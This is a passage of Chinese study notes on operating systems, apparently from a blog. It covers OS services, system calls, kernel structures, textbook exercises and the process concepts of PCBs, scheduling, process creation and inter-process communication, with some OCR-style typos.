其中控制这些命令和命令的指令被输入文件中，通过执行文件来实现。</li><li>最为常用的是图形用户界面（graphical user interface,GUI)， 此时界面是一个视窗系统， 它具有定位设备来指挥I/O、从菜单来选择、选中部分并用键盘输入文本。有些系统还提供了两种甚至所有这三种界面。</li></ul></li><li><p><strong>程序执行</strong>： 系统必须能将程序装入内存并运行程序。程序必须能结束执行， 包括正常或不正常结束（指明错误）。</p></li><li><p><strong>I/O操作</strong>：运行程序可能需要I/O，这些I/O 可能涉及文件或设备。对于特定设备，需要特定的功能（如刻录CD或DVD驱动器，或清屏）。为了提高效率和进行保护， 用户通常不能直接控制νo设备。因此，操作系统必须提供进行I/O操作的方法。</p></li><li><p><strong>文件系统操作</strong>： 文件系统特别重要。很明显， 程序需要读写文件和目录， 也需要根据文件名来创建和删除文件、搜索一个给定的文件、列出文件信息。最后，有些程序还包括了基于文件所有权的允许或拒绝对文件或目录的访问管理。</p></li><li><p><strong>通信</strong>：在许多情况下，一个进程需要与另一个进程交换信息。这种通信有两种主要形式。一种是发生在同一台计算机运行的两个进程之间。另一种是运行在由网络连接起来<br>的不同的计算机上的进程之间。通信可以通过共事冲序来实现，也可通过信息交换技术来实现（对于消息交换，消息包通过操作系统在进程之间移动）。</p></li><li><p><strong>错误检测</strong>：操作系统需要时刻知道可能出现的错误。</p></li><li><p><strong>资源分配</strong>：当多个用户或多个作业同时运行时，必须为每一个分配资源。</p></li><li><p><strong>统计</strong>：跟踪记录那些用户使用了多少资源和什么类型的资源。</p></li><li><p><strong>保护和安全</strong>：多进程并发执行时，一个进程不能干预另一个进程或操作系统本身。</p></li></ul><h3 id="2-2-操作系统的用户界面"><a href="#2-2-操作系统的用户界面" class="headerlink" title="2.2 操作系统的用户界面"></a>2.2 操作系统的用户界面</h3><h4 id="2-2-1-命令解释程序"><a href="#2-2-1-命令解释程序" class="headerlink" title="2.2.1 命令解释程序"></a>2.2.1 命令解释程序</h4><p>具有多个命令解释程序选择的系统中， 解释程序被称为外壳(Shell）。例如，在UNIX 和Linux 系统中，有多种不同的Shell 可供用户选择，包括：Bourne Shell、C Shell、Bourne-Again Shell、Korn Shell 等。</p><h4 id="2-2-2-图形用户界面"><a href="#2-2-2-图形用户界面" class="headerlink" title="2.2.2 图形用户界面"></a>2.2.2 图形用户界面</h4><p>与用户通过命令行直接输入命令不同， GUI 允许提供基于鼠标的窗口和菜单系统作为接口。</p><h3 id="2-3-系统调用"><a href="#2-3-系统调用" class="headerlink" title="2.3 系统调用"></a>2.3 系统调用</h3><p>系统调用Csystem call）提供了操作系统提供的有效服务界面。</p><p>系统调用提供了进程与操作系统之间的接口</p><p><strong>系统调用</strong></p><p>操作系统服务的编程接口<br>通常由高级语言编写（C或C++）<br>程序访问通常通过高层次 的API接口（C标准库的库函数）而不是直接进行系统调用<br>每个系统调用对应一个系统调用编号</p><h4 id="系统调用与函数调用的区别"><a href="#系统调用与函数调用的区别" class="headerlink" title="系统调用与函数调用的区别"></a><strong>系统调用与函数调用的区别</strong></h4><p><strong>系统调用</strong></p><ol><li><p>使用INT和IRET指令，内核和应用程序使用的是不同的堆栈，因此存在堆栈的切换，从用户态切换到内核态，从而可以使用特权指令操控设备</p></li><li><p>依赖于内核，不保证移植性</p></li><li><p>在用户空间和内核上下文环境间切换，开销较大</p></li><li><p>是操作系统的一个入口点</p></li></ol><p><strong>函数调用</strong></p><ol><li>使用CALL和RET指令，调用时没有堆栈切换</li><li>平台移植性好</li><li>属于过程调用，调用开销较小</li><li>一个普通功能函数的调用</li></ol><h4 id="API与系统调用"><a href="#API与系统调用" class="headerlink" title="API与系统调用"></a>API与系统调用</h4><p><strong>API</strong>是函数的定义，规定了这个函数的功能，跟内核无直接关系。</p><p><strong>系统调用</strong>是通过中断向内核发请求，实现内核提供的某些服务。     </p><p><strong>联系</strong>：一个API可能会需要一个或多个系统调用来完成特定功能。通俗点说就是如果这个api需要跟内核打交道就需要系统调用，否则不需要。 程序员调用的是API（API函数），然后通过与系统调用共同完成函数的功能。 </p><p>API是一个提供给应用程序的接口，一组函数，是与程序员进行直接交互的。 系统调用则不与程序员进行交互的，它根据API函数，通过一个软中断机制向内核提交请求，以获取内核服务的接口。   </p><p>并不是所有的API函数都一一对应一个系统调用。一个API函数可能需要几个系统调用来共同完成函数的功能。一些API函数不需要调用相应的系统调用（因此它所完成的不是内核提供的服务）</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114112604666.png" alt="image-20211114112604666"></p><h3 id="2-4-系统调用类型"><a href="#2-4-系统调用类型" class="headerlink" title="2.4 系统调用类型"></a>2.4 系统调用类型</h3><h4 id="2-4-1-进程控制"><a href="#2-4-1-进程控制" class="headerlink" title="2.4.1 进程控制"></a>2.4.1 进程控制</h4><ul><li>结束， 放弃</li><li>装入， 执行</li><li>创建进程， 终止进程</li><li>取得进程属性， 设置进程属性</li><li>等待时间</li><li>等待事件， 唤醒事件</li><li>分配和释放内存</li></ul><h4 id="2-4-2-文件管理"><a href="#2-4-2-文件管理" class="headerlink" title="2.4.2 文件管理"></a>2.4.2 文件管理</h4><ul><li>创建文件， 删除文件</li><li>打开， 关闭</li><li>读、写、重定位</li><li>取得文件属性， 设置文件属性</li></ul><h4 id="2-4-3-设备管理"><a href="#2-4-3-设备管理" class="headerlink" title="2.4.3 设备管理"></a>2.4.3 设备管理</h4><ul><li>请求设备， 释放设备</li><li>读、写、重定位</li><li>取得设备属性， 设置设备属性</li><li>逻辑连接或断开设备</li></ul><h4 id="2-4-4-信息维护"><a href="#2-4-4-信息维护" class="headerlink" title="2.4.4 信息维护"></a>2.4.4 信息维护</h4><ul><li>读取时间或日期， 设置时间或日期</li><li>读取系统数据， 设置系统数据</li><li>读取进程， 文件或设备属性</li><li>设置进程， 文件或设备属性</li></ul><h4 id="2-4-5-通信"><a href="#2-4-5-通信" class="headerlink" title="2.4.5 通信"></a>2.4.5 通信</h4><ul><li>创建， 删除通信连接</li><li>发送， 接受消息</li><li>传递状态消息</li><li>连接或断开远程设备</li></ul><h3 id="2-5-系统程序"><a href="#2-5-系统程序" class="headerlink" title="2.5 系统程序"></a>2.5 系统程序</h3><p>系统程序提供了一个方便的环境， 以开发程序和执行程序。其中一小部分只是系统调用的简单接口， 其他的可能是相当复杂的。它们可分为如下几类：</p><ul><li><strong>文件管理</strong>：这些程序创建、删除、复制、重新命名、打印、转储、列出和操作文件和目录。</li><li><strong>状态信息</strong>：一些程序从系统那里得到日期、时间、可用内存或磁盘空间的数量、用户数或类似状态信息。另一些更为复杂， 能提供详细的性能、登录和调试信息。通常， 这些信息经格式化后，再打印到终端、输出设备或文件， 或在GUI的窗体上显示。有些系统还支持注册衰，它被用于存储和检索配置信息。</li><li><strong>文件修改</strong>：－ 有多个编辑器可以创建和修改位于磁盘或其他存储设备上的文件内容。也可能有特殊的命令被用于查找文件内容或完成文本的转换。</li><li><strong>程序语言支持</strong>： 常用程序设计语言（如C、C＋＋、Java、Visual Basic和Perl等〉的编译程序、汇编程序、调试程序和解释程序通常与操作系统一起提供给用户。</li><li><strong>程序装入和执行</strong>：一旦程序汇编或编译后， 它必须装入内存才能执行。系统可能要提供绝对加载程序、重定位加载程序、链接编辑器和覆盖式加载程序。系统还需要有高级语言或机器语言的调试程序。</li><li><strong>通信</strong>：这些程序提供了在进程、用户和计算机系统之间创建虚拟连接的机制。它们允许用户在互相的屏幕上发送消息， 浏览网页， 发送电子邮件， 远程登录， 从一台机器向另一台机器传送文件。</li></ul><h3 id="2-6-操作系统设计和实现"><a href="#2-6-操作系统设计和实现" class="headerlink" title="2.6 操作系统设计和实现"></a>2.6 操作系统设计和实现</h3><h4 id="2-6-1-设计目标"><a href="#2-6-1-设计目标" class="headerlink" title="2.6.1 设计目标"></a>2.6.1 设计目标</h4><h4 id="2-6-2-机制与策略"><a href="#2-6-2-机制与策略" class="headerlink" title="2.6.2 机制与策略"></a>2.6.2 机制与策略</h4><h4 id="2-6-3-实现"><a href="#2-6-3-实现" class="headerlink" title="2.6.3 实现"></a>2.6.3 实现</h4><h3 id="2-7-操作系统结构"><a href="#2-7-操作系统结构" class="headerlink" title="2.7 操作系统结构"></a>2.7 操作系统结构</h3><h4 id="2-7-1-简单结构"><a href="#2-7-1-简单结构" class="headerlink" title="2.7.1 简单结构"></a>2.7.1 简单结构</h4><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114121729295.png" alt="image-20211114121729295"></p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114121720130.png" alt="image-20211114121720130"></p><h4 id="2-7-2-分层方法"><a href="#2-7-2-分层方法" class="headerlink" title="2.7.2 分层方法"></a>2.7.2 分层方法</h4><ul><li><p>操作系统被划分为若干层级，每一层都建立在较低层之上</p></li><li><p>模块化</p></li></ul><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114122235688.png" alt="image-20211114122235688"></p><ul><li><p>优点</p><ul><li>便于构造和调试  简化系统设计和实现</li></ul></li><li><p>不足</p><ul><li>定义和划分困难  效率相对要低一些</li></ul></li></ul><h4 id="2-7-3-微内核"><a href="#2-7-3-微内核" class="headerlink" title="2.7.3 微内核"></a>2.7.3 微内核</h4><ul><li><p>这种方法将所有非基本部分从内核中移走，并将它们当做系统级程序和用户级程序来实现，用这种方法来构建操作系统</p></li><li><p>用户模块之间采用消息传递的方式进行通信</p></li><li><p>优点</p><ul><li>微内核易于扩展</li><li>易于提升OS至一个新的体系结构</li><li>更可靠（内核模式中运行的代码更少）</li><li>更安全</li></ul></li><li><p>缺点</p><ul><li>用户空间与内核空间的通信代价较高</li></ul></li></ul><h4 id="2-7-4-模块"><a href="#2-7-4-模块" class="headerlink" title="2.7.4 模块"></a>2.7.4 模块</h4><p>用面向对象编程技术来生成模块化的内核。这里， 内核有一组核心部件， 以及在启动或运行时对附加服务的动态链接。</p><ul><li>用面向对象的方法</li><li>内核的组成部分相互分离</li><li>任务之间的交互通过已知的接口来实现</li><li>每个模块在内核中是按照需要可装载的</li><li>比分层系统更为灵活</li><li>比微内核更高效（不需要调用消息传递来通信）</li></ul><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114122827683.png" alt="image-20211114122827683"></p><h3 id="2-8-虚拟机"><a href="#2-8-虚拟机" class="headerlink" title="2.8 虚拟机"></a>2.8 虚拟机</h3><h4 id="2-8-1-实现"><a href="#2-8-1-实现" class="headerlink" title="2.8.1 实现"></a>2.8.1 实现</h4><h4 id="2-8-2-优点"><a href="#2-8-2-优点" class="headerlink" title="2.8.2 优点"></a>2.8.2 优点</h4><ul><li>通过完全保护系统资源，虚拟机提供了一个坚实的安全层</li><li>虚拟机允许进行系统开发而不必中断正常的系统操作</li></ul><p>缺点</p><ul><li>虚拟机概念很难提供真实的硬件效果</li></ul><h4 id="2-8-3-实例"><a href="#2-8-3-实例" class="headerlink" title="2.8.3 实例"></a>2.8.3 实例</h4><h3 id="2-9-系统生成"><a href="#2-9-系统生成" class="headerlink" title="2.9 系统生成"></a>2.9 系统生成</h3><h3 id="2-10-系统启动"><a href="#2-10-系统启动" class="headerlink" title="2.10 系统启动"></a>2.10 系统启动</h3><h3 id="2-11-小结"><a href="#2-11-小结" class="headerlink" title="2.11 小结"></a>2.11 小结</h3><h3 id="2-12-习题"><a href="#2-12-习题" class="headerlink" title="2.12 习题"></a>2.12 习题</h3><p><strong>2.1 操作系统提供的服务和功能可以主要分为两大类。简要描述这两大类并讨论它们的区别。</strong></p><blockquote><p>第一种操作系统提供的服务是<strong>用来保护在系统中同时运行的不同进程</strong>。进程只被允许获得与它们地址空间有联系的内存位置。同样，进程不允许破坏和其他用户有关的文件。一个进程同样不允许在没有操作系统的干预<br>下直接进入设备。</p><p>第二种服务由操作系统提供的服务是<strong>提供一种新的功能，而这种功能并不直接被底层的硬件支持</strong>。虚拟存储器和文件系统就是由操作系统提供的这种新服务的实例。</p></blockquote><p><strong>2.2 列出操作系统提供使用户更为方便地使用计算机系统的5个服务，并说明在哪些情况下用户级程序不能够提供这些服务。请解释为什么。</strong></p><blockquote><p>2.1操作系统服务</p></blockquote><p><strong>2.3 给出三种向操作系统传递参数的常用方法。</strong></p><blockquote><ol><li>通过寄存器来传递参数</li><li>寄存器传递参数块的首地址</li><li>参数通过程序存放或压进堆栈中， 并通过操作系统弹出堆栈。</li></ol></blockquote><p><strong>2.4 介绍一下如何获得一个程序在执行其不同部分的代码时所耗时间的统计简衰。讨论获得该统计简表的重要性。</strong></p><p><strong>2.5 操作系统关于文件管理的5个主要功能是什么？</strong></p><blockquote><p>2.4.2</p></blockquote><p><strong>2.6 操作文件和设备时，采用同样的系统调用界面有什么优点和缺点？</strong></p><p><strong>2.7 命令解释器的用途是什么？为什么它经常是与内核分开的？是否可能采用操作系统提供的系统调用接口为用户开发一个新的命令解释器？</strong></p><p><strong>2.8 进程间通信的两个模式是什么？这两种方法有何长处和缺点？</strong></p><blockquote><p>共享内存系统</p><ul><li><p>优点</p><ul><li>最快的一种通信方式，多个进程可同时访问同一片内存空间，相对其他方式来说具有更少的数据拷贝，效率较高。</li><li>随内核持续，相比于随进程持续生命力更强。</li></ul></li><li><p>缺点</p><p>需要结合信号灯或其他方式来实现多个进程间同步，自身不具备同步机制。</p></li></ul><p>消息传递系统</p><ul><li>优点<ul><li>可以实现通信进程间的同步</li></ul></li><li>缺点<ul><li>效率较低</li></ul></li></ul></blockquote><p><strong>2.9 为什么要将机制和策略区分开来？</strong></p><p><strong>2.10 为什么Java提供从Java程序调用以C或C＋＋编写的本地方法？举出一个本地方法的例子。</strong></p><p><strong>2.11 如果操作系统的两个部件相互依赖，有时实现分层方法会很困难． 请区别两个功能紧密耦合的系统部件如何分层。</strong></p><p><strong>2.12 系统设计采用微内核设计的主要优点是什么？用户程序和系统服务在微内核结构内如何相互影响？采用微内核设计的缺点又是什么？</strong></p><blockquote><p>优点主要包括以下几点：</p><ul><li><p><strong>灵活性高易拓展</strong>,增加一个新的服务不需要修改内核</p></li><li><p>在用户模式中中比在内核模式中<strong>更安全</strong>、更易操作</p></li><li><p>一个简单的内核设计和功能一般导致一个<strong>更可靠</strong>的操作系统</p></li><li><p><strong>可移植性强</strong></p></li><li><p>易于提升OS至一个新的体系结构</p></li></ul><p>用户程序和系统服务通过使用进程件的通信机制在微内核中相互作用，例如发送消息。这些消息由操作系统运送。</p><p>缺点是</p><ul><li>与进程间通信的过度联系和为了保证用户程序和系统服务相互作用而频繁使用操作系统的消息传递功能。使得<strong>效率较低</strong></li></ul></blockquote><p><strong>2.13 模块化内核方法和分层方法在哪些方面类似？哪些方面不同？</strong></p><blockquote><p>二者的相似之处在于实现了系统的模块化设计，每一部分都对外提供接口，便于对系统进行维护和修改。</p><p>二者的区别在于模块化内核方法比分层方法更为灵活，它的任一模块都能调用任何其他模块，提高了系统效率；而分层方法通过层层的系统调用实现上层与下层模块之间的通信，增加了系统开销。</p></blockquote><p><strong>2.14 操作系统设计员采用虚拟机结构的主要优点是什么？对用户来说主要有什么好处？</strong></p><p><strong>2.15 为什么说一个TIT (just-in-time）编译器对执行一个Java程序是有用的？</strong></p><p><strong>2.16 在VMware这样的系统中，客户操作系统与主操作系统有什么关系？选择主操作系统要考虑什么因素？</strong></p><h2 id="第3章-进程"><a href="#第3章-进程" class="headerlink" title="第3章 进程"></a>第3章 进程</h2><h3 id="3-1-进程概念"><a href="#3-1-进程概念" class="headerlink" title="3.1 进程概念"></a>3.1 进程概念</h3><h4 id="3-1-1-进程"><a href="#3-1-1-进程" class="headerlink" title="3.1.1 进程"></a>3.1.1 进程</h4><p><strong>进程</strong>：是一个可并发执行的具有独立功能的程序关于某个数据集合的一次执行过程，也是操作系统进行资源分配和保护的基本单位。</p><p><strong>进程和程序的区别</strong></p><ul><li><p><strong>进程</strong>反映的是一个动态概念，而<strong>程序</strong>是一个静态概念；程序是指令的有序集合，没有任何执行的含义，而进程则强调的是执行过程，它动态被创建、执行和消亡。</p></li><li><p><strong>进程</strong>是一个能独立运行的单位，能与其他进程并发执行，进程是作为资源申请和调度单位存在的。而<strong>程序</strong>则没有。因为程序不反映执行过程。</p></li><li><p>程序和进程并不一定具有一一对应的关系。不同的进程可以来自于同一程序，只要该程序所对应的数据集不同。</p></li></ul><p>进程包括文本段、堆栈段（包括临时数据，如函数参数、返回地址和局部变量）、数据段（包括全局变量）、堆（进程运行时动态分配的内存）</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20210622073331434.png" alt="image-20210622073331434"></p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211024142834120.png" alt="内存中的进程"></p><h4 id="3-1-2-进程状态"><a href="#3-1-2-进程状态" class="headerlink" title="3.1.2 进程状态"></a>3.1.2 进程状态</h4><p>进程在执行时会改变状态。进程状态在某种程度上是由当前活动所定义的。每个进程可能处于下列状态之一：</p><ul><li>新的：进程正在被创建。</li><li>运行： 指令正在被执行。</li><li>等待：进程等待某个事件的发生（如I/O完成或收到信号）。</li><li>就绪：进程等待分配处理器。</li><li>终止：进程完成执行。</li></ul><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211024144135058.png" alt="image-20211024144135058"></p><h4 id="3-1-3-进程控制块"><a href="#3-1-3-进程控制块" class="headerlink" title="3.1.3 进程控制块"></a>3.1.3 进程控制块</h4><p>每个进程在操作系统内用进程控制块（process control block, PCB ，也称为任务控制块）来表示。</p><p>图3.3 给出了一个PCB 的例子， 它包含许多与一个特定进程相关的信息。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211024144308211.png" alt="image-20211024144308211"></p><ul><li>进程状态：状态可包括新的、就绪、运行、等待、停止等。</li><li>程序计数器：计数器表示进程要执行的下个指令的地址。</li><li> CPU 寄存器：根据计算机体系结构的不同， 寄存器的数量和类型也不同。它们包括累加器、索引寄存器、堆钱指针、通用寄存器和其他条件码信息寄存器。与程序计数器一起，这些状态信息在出现中断时也需要保存， 以便进程以后能正确地继续执行（见图3.4)。</li><li> CPU 调度信息：这类信息包括进程优先级、调度队列的指针和其他调度参数（第5章讨论进程调度）。</li><li>内存管理信息： 根据操作系统所使用的内存系统， 这类信息包括基址和界限寄存器的值、页表或段表（见第8章）。</li><li>记账信息：这类信息包括CPU时间、实际使用时间、时间界限、记账数据、作业或进程数量等。</li><li> I/O状态信息：这类信息包括分配给进程的I/O设备列表、打开的文件列表等。</li></ul><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211024144700188.png" alt="image-20211024144700188"></p><p><strong>PCB的作用</strong></p><ul><li>PCB可唯一标识一个进程</li><li>PCB中的信息为进程的控制提供依据</li><li>PCB将程序变成了进程</li><li>PCB是进程在系统中存在的唯一标志</li></ul><h4 id="3-1-4-线程"><a href="#3-1-4-线程" class="headerlink" title="3.1.4 线程"></a>3.1.4 线程</h4><p>迄今为止所讨论的进程模型暗示： 一个进程是一个只能进行单个执行线程的程序。例如， 如果一个进程运行一个字处理器程序， 那么只能执行单个线程指令。这种单一控制线程使得进程一次只能执行一个任务。例如， 用户不能在同一进程内， 同时输入字符和进行拼写检查。</p><p>许多现代操作系统扩展了进程概念以支持一次能执行多个线程。第4章将讨论多线程进程。</p><h3 id="3-2-进程调度"><a href="#3-2-进程调度" class="headerlink" title="3.2 进程调度"></a>3.2 进程调度</h3><p>多道程序设计的目的是无论何时都有进程在运行，从而使CPU利用率达到最大化。</p><p>分时系统的目的是在进程之间快速切换CPU以便用户在程序运行时能与其进行交互。</p><h4 id="3-2-1-调度队列"><a href="#3-2-1-调度队列" class="headerlink" title="3.2.1 调度队列"></a>3.2.1 调度队列</h4><p>讨论进程调度的常用表示方法是队列图， 如图3.7 所示。每个长方形表示一个队列。<br>有两种队列： 就绪队列和一组设备队列。圆形表示为队列服务的资源， 箭头表示系统内进程的流向。</p><p>新进程开始处于就绪队列。它在就绪队列中等待直到被选中执行或被派遣。当进程分配到CPU 并执行时， 可能发生下面几种事件中的一种：</p><ul><li>进程可能发出一个I/O请求， 并被放到I/O队列中。</li><li>进程可能创建一个新的子进程， 并等待其结束。</li><li>进程可能会由于中断而强制释放CPU， 并被放回到就绪队列中。</li></ul><p>对于前两种情况， 进程最终从等待状态切换到就绪态， 并放回到就绪队列中。进程继续这一循环直到终止， 到时它将从所有队列中删除， 其PCB 和资源将得以释放。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211025195355812.png" alt="image-20211025195355812"></p><h4 id="3-2-2-调度程序"><a href="#3-2-2-调度程序" class="headerlink" title="3.2.2 调度程序"></a>3.2.2 调度程序</h4><p>进程在其生命周期中会在各种调度队列之间迁移。为了调度， 操作系统必须按某种方式从这些队列中选择进程。进程选择是由相应的<strong>调度程序</strong>（ scheduler ）来执行的。</p><p>通常对于批处理系统， 进程更多地是被提交， 而不是马上执行。这些进程被放到大容量存储设备（通常为磁盘〉的缓冲池中，保存在那里以便以后执行。</p><p><strong>长期调度程序</strong>（long-term scheduler ）或作业调度程序（job scheduler ） 从缓冲池中选择进程， 井装入内存以准备执行。</p><p><strong>短期调度程序</strong>（ short-term scheduler ）或CPU 调度程序从准备执行的进程中选择进程， 并为之分配CPU。</p><p>这两个调度程序的<strong>主要差别</strong>是它们执行的频率。</p><p><strong>中期调度程序</strong>的核心思想是能将进程从内存（或从CPU 竞争）中移出， 从而降低多道程序设计的程度。之后， 进程能被重新调入内存， 并从中断处继续执行。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211025200346176.png" alt="image-20211025200346176"></p><h4 id="3-2-3-上下文切换"><a href="#3-2-3-上下文切换" class="headerlink" title="3.2.3 上下文切换"></a>3.2.3 上下文切换</h4><p>当发生一个中断时，系统需要保存当前运行在CPU 中进程的上下文， 从而在其处理完后能恢复上下文， 即先中断进程， 之后再继续。</p><p><strong>进程上下文</strong>用进程的PCB 表示， 它包括CPU 寄存器的值、进程状态（见图3.2） 和内存管理信息等。通常，通过执行一个<strong>状态保存</strong>（ state save） 来保存CPU当前状态（不管它是内核模式还是用户模式）， 之后执行一个<strong>状态恢复</strong>（ state restore）重新开始运行。</p><p>将CPU切换到另一个进程需要保存当前进程的状态并恢复另一个进程的状态，这一任务称为<strong>上下文切换</strong>（ context switch）。当发生上下文切换时， 内核会将旧进程的状态保存在其PCB中，然后装入经调度要执行的并己保存的新进程的上下文。</p><h3 id="3-3-进程操作"><a href="#3-3-进程操作" class="headerlink" title="3.3 进程操作"></a>3.3 进程操作</h3><h4 id="3-3-1-进程创建"><a href="#3-3-1-进程创建" class="headerlink" title="3.3.1 进程创建"></a>3.3.1 进程创建</h4><p>进程在其执行过程中， 能通过创建进程系统调用（ create-process system call） 创建多个新进程。创建进程称为父进程， 而新进程称为子进程。每个新进程可以再创建其他进程，从而形成了进程树。</p><p><strong>创建过程</strong></p><ul><li><p>申请空白PCB</p></li><li><p>分配资源</p></li><li><p>初始化PCB</p></li><li><p>插入就绪队列</p></li></ul><p>进程创建实质上是生成一个PCB</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114152544023.png" alt="image-20211114152544023"></p><p>当进程创建新进程时， 有两种执行可能：<br>①父进程与子进程并发执行。<br>②父进程等待， 直到某个或全部子进程执行完。</p><p>新进程的地址空间也有两种可能：<br>①子进程是父进程的复制品（具有与父进程相同的程序和数据）。<br>②子进程装入另一个新程序。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211025201136927.png" alt="image-20211025201136927"></p><h4 id="3-3-2-进程终止"><a href="#3-3-2-进程终止" class="headerlink" title="3.3.2 进程终止"></a>3.3.2 进程终止</h4><p><strong>进程终止的过程</strong></p><ul><li><p>查找进程</p></li><li><p>查找该进程的PCB</p></li><li><p>中止执行</p></li><li><p>终止子进程</p></li><li><p>归还资源</p></li><li><p>将PCB从所在队列移出</p></li><li><p>释放PCB</p></li></ul><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114152857377.png" alt="image-20211114152857377"></p><p>当进程完成执行最后的语句并使用系统调用exit()请求操作系统删除自身时， 进程终止。这时， 进程可以返回状态值（通常为整数〉到父进程（通过系统调用wait（））。所有进程资源（包括物理和虚拟内存、打开文件和I/O缓冲〉会被操作系统释放。</p><p>在其他情况下也会出现终止。进程通过适当的系统调用（如Win32 中的TerminatePorcess（）） 能终止另一个进程。通常， 只有被终止进程的父进程才能执行这一系统调用。否则， 用户可以任意地终止彼此的作业。</p><h4 id="3-3-3-进程阻塞"><a href="#3-3-3-进程阻塞" class="headerlink" title="3.3.3 进程阻塞"></a>3.3.3 进程阻塞</h4><p><strong>阻塞过程</strong></p><ul><li><p>停止执行</p></li><li><p>更改PCB为阻塞</p></li><li><p>保留现场</p></li><li><p>PCB插入相应阻塞队列</p></li><li><p>提示重新调度</p></li></ul><p><strong>唤醒过程</strong></p><ul><li>根据释放条件寻找相应进程</li><li>改PCB状态为就绪</li><li>将PCB插入就绪队列</li></ul><h3 id="3-4-进程间通信"><a href="#3-4-进程间通信" class="headerlink" title="3.4 进程间通信"></a>3.4 进程间通信</h3><p><strong>允许进程协作的理由</strong></p><ul><li>信息共享（information sharing）：由于多个用户可能对同样的信息感兴趣（例如共享的文件）， 所以必须提供环境以允许对这些信息进行并发访问。</li><li>提高运算速度（computation speedup）： 如果希望一个特定任务快速运行， 那么必须将它分成子任务，每个子任务可以与其他子任务并行执行。注意，如果要实现这样的加速，需要计算机有多个处理单元（例如CPU或I/0通道）。</li><li>模块化（modularity）：可能需要按模块化方式构造系统， 如第2章所讨论， 可将系统功能分成独立进程或线程。</li><li>方便（convenience）：单个用户也可能同时执行许多任务。例如，一个用户可以并行进行编辑、打印和编译操作。</li></ul><p>进程间通信有两种基本模式：</p><p><strong>(1) 共享内存</strong></p><p>在共享内存模式中， 建立起一块供协作进程共享的内存区域， 进程通过向此共享区域读或写入数据来交换信息。</p><p><strong>(2) 消息传递</strong></p><p>在消息传递模式中，通过在协作进程间交换消息来实现通信。</p><p>图3.13 给出了这两种模式的对比。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211026154454752.png" alt="image-20211026154454752"></p><h4 id="3-4-1-共享内存系统"><a href="#3-4-1-共享内存系统" class="headerlink" title="3.4.1 共享内存系统"></a>3.4.1 共享内存系统</h4><p>采用共享内存的进程间通信需要通信进程建立<strong>共享内存区域</strong>。通常， 一块共享内存区域驻留在生成共享内存段进程的地址空间。其他希望使用这个共享内存段进行通信的进程必须将此放到它们自己的地址空间上。</p><p>采用共享内存是解决生产者一消费者问题方法中的一种。为了允许生产者进程和消费进程能并发执行， 必须要有一个缓冲来被生产者填充并被消费者所使用。此缓冲驻留在生产者进程和消费者进程的共享内存区域内， 当消费者使用一项时， 生产者能产生另一项。生产者和消费者必须同步， 以免消费者消费一个没有生产出来的项。</p><p>可以使用两种缓冲。<strong>无限缓冲</strong>（unbounded-buffer）对缓冲大小没有限制。消费者可能不得不等待新的项， 但生产者总是可以产生新项。有限缓冲（ bounded-buffer）假设缓冲大小固定。对于这种情况， 如果缓冲为空， 那么消费者必须等待：如果缓冲为满， 那么生产者必须等待。</p><p>共享缓冲是通过循环数组和两个逻辑指针来实现的： in 和out。变量in 指向缓冲中下一个空位： out 指向缓冲中的第一个满位。当in==out 时， 缓冲为空： (in+1)%BUFFER_SIZE= out 时，缓冲为满。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211026155644352.png" alt="image-20211026155644352"></p><h4 id="3-4-2-消息传递系统"><a href="#3-4-2-消息传递系统" class="headerlink" title="3.4.2 消息传递系统"></a>3.4.2 消息传递系统</h4><p>消息传递提供一种机制以允许进程不必通过共享地址空间来实现通信和同步。</p><p>消息传递工具提供至少两种操作：发送（消息） 和接收（消息） 。</p><ol><li><p><strong>命名</strong></p><p><strong>直接通信</strong>:</p><p>对于<strong>直接通信</strong>， 需要通信的每个进程必须明确地命名通信的接收者或发送者。采用这种方案， 原语send()和receive()定义如下：</p><ul><li>send(P,message）：发送消息到进程P。</li><li>receive(Q, message）： 接收来自进程Q的消息。</li></ul><p>这种方案的通信线路具有如下属性：</p><ul><li>在需要通信的每对进程之间自动建立线路。进程仅需知道相互通信的标识符。</li><li>一个线路只与两个进程相关。</li><li>每对进程之间只有一个线路。</li></ul><p>这种方案展示了<strong>对称寻址</strong>， 即发送和接收进程必须命名对方以便通信。</p><p>这种方案一个变形采用<strong>非对称寻址</strong>， 即只要发送者命名接收者， 而接收者不需要命名发送者。采用这种方案， 